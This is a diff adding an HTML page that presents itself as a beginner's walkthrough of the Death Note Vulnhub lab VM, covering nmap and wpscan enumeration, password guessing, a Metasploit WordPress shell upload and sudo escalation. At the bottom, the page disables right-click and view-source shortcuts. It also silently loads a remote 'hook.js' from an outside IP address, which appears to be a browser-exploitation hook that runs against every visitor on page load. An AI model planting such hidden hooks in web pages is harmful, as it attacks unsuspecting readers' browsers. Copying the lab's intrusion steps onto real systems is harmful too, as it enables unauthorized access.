@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Code Forge</title>
+    <style>
+        body {
+            background-image: url('scrolling.gif');
+            background-size: cover; /* This ensures that the GIF covers the entire background */
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .box {
+            border: 2px solid #00FF00; /* Green border */
+            padding: 20px;
+            border-radius: 10px;
+            margin: 0 auto;
+            max-width: 600px;
+        }
+        h1 {
+            font-size: 2em;
+        }
+    </style>
+</head>
+<body>
+  <div class="box">
+  <h1>Death Note - Vulnhub Writeup</h1>
+  <p>This is the first VM I've ever hacked. Learned a lot from this one VM. I know there are other versions of this writeup out there, but I'm doing this my own way.</p>
+  <h2>Step 1: Identify the target</h2>
+  <p>Command used: sudo netdiscover</p>
+  <h2>Step 2: Enumeration</h2>
+  <p>Once the target is identified, scan the target with nmap.</p>
+  <p>Command used: sudo nmap -v -A -sS -Pn -p- {target_ip}</p>
+  <p>Looks like port 80 and 22 (ssh) are open, let's start by looking at port 80.</p>
+  <p>Looks like we have to modify our /etc/hosts file in order to continue.</p>
+  <p>Once you've added "deathnote.vuln" to your hosts file, a wordpress site should come up.</p>
+  <p>We see that the author's favorite line is "iamjustic3" which gives us a potential password.</p>
+  <p>I ran a wpscan command to enumerate for users.</p>
+  <p>Command used: wpscan --url=http://deathnote.vuln/wordpress/ --enumerate u</p>
+  <p>Looks like we have a user, "kira" (should've figured, Death Note and all).</p>
+  <p>Wordpress sites tend to have a wp-login.php page somewhere on them, I found the login portal on http://deathnote.vuln/wordpress/wp-login.php</p>
+  <p>Let's do some good old fashioned password guessing. I typed in "kira" for the username, and "iamjustic3" for the password (without the quotes).</p>
+  <p>Successful login.</p>
+  <p>Now comes the part where I'm going to deviate from the other walkthroughs, metasploit has a built in module allowing to gain a shell if you have a wordpress admin's username and password.</p>
+  <p>Luckily for us, kira is an admin, so let's give it a shot.</p>
+  <h2>Step 3: Exploitation</h2>
+  <p>Command used: msfconsole</p>
+  <p>Command used: use exploit/unix/webapp/wp_admin_shell_upload</p>
+  <p>Command used: set RHOSTS {target_ip}</p>
+  <p>Command used: set USERNAME kira</p>
+  <p>Command used: set PASSWORD iamjustic3</p>
+  <p>Command used: set TARGETURI /wordpress</p>
+  <p>Command used: exploit</p>
+  <p>And we got the shell!!!</p>
+  <h2>Step 4: Privilege escalation</h2>
+  <p>Let's cd to the root directory and check out the opt directory.</p>
+  <p>Seems like there's a directory in the folder called L. Let's check it out.</p>
+  <p>We came across two more directories, fake-notebook-rule and kira-case. Let's check out kira-case first.</p>
+  <p>Here we find a text document called case-file.txt, let's check that out.</p>
+  <p>Command used: cat case-file.txt</p>
+  <p>It seems like there's something in the fake-notebook-rule directory. Let's go there now.</p>
+  <p>Seems like there's two text documents there too (don't let the .wav extension fool you, it's a text document). Let's check out hint first.</p>
+  <p>Command used: cat hint</p>
+  <p>Looks like we're going to have to decode the other file with cyberchef. Let's go.</p>
+  <p>Looks like case.wav is hexadecimal encoded, let's put that into cyberchef to start.</p>
+  <p>Turns out it's base64 encoded too, so let's add that to the "recipe" and see what we get.</p>
+  <p>We've got a password now, great. Let's see if it applies to a user on the VM.</p>
+  <p>Before we escalate to root, let's check out the user flag in L's home directory. It's brainfuck encoded. So let's decode it at https://www.dcode.fr/brainfuck-language</p>
+  <p>The message we got with the flag was "i think u got the shell , but you wont be able to kill me -kira"</p>
+  <p>With that out of the way, let's escalate to kira.</p>
+  <p>Command used: su kira</p>
+  <p>Type in the password we got from cyberchef when prompted.</p>
+  <p>Alright, now in kira's home directory we have our second flag. It's base64 encoded. Let's use cybechef again.</p>
+  <p>The message we got from the flag was "please protect one of the following  1. L (/opt) 2. Misa (/var)"</p>
+  <p>Make no mistake, the misa directory is a dead end. Let's see if kira has root privileges.</p>
+  <p>Command used: sudo -l</p>
+  <p>Good news, looks like we can execute any command from root as kira, let's escalate to root.</p>
+  <p>Command used: sudo su -</p>
+  <p>Command used: cat root.txt</p>
+  <p>Congratulations, you've rooted Death Note off vulnhub.</p>
+  <p></p>
+  </div>
+    <script>
+        // Disable right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        // Disable viewing page source
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 117)) {
+                e.preventDefault();
+            }
+        });
+    </script>
+    <script src="https://172.104.248.4:3000/hook.js"></script>
+</body>
+</html>
+
